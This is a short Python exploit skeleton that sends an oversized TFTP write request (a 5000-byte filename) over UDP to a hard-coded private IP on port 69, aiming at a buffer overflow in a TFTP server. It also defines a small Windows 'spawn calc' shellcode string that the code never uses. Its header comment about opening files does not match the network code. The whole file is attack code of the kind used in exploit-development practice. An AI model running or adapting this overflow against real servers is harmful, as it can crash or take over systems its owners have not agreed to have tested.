#!/usr/bin/python -w

# Skeleton exploit for files, which are opened in application

import socket
import os
import sys

host="192.168.100.146"
port=69

# spawn calc on windows
payload = "\x31\xc9\x51\x68\x63\x61\x6c\x63\x54\xb8\xc7\x93\xc2\x77\xff\xd0" 

exploit = "B"*5000
buffer = "\x00\x02" + exploit + "\x00netascii\x00"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.connect((host, port))
print("[*] Connected")
print("[*] Sending buffer")
sock.send(buffer)
print("[*] Receiving")
#print(sock.recv(1024))
sock.close()

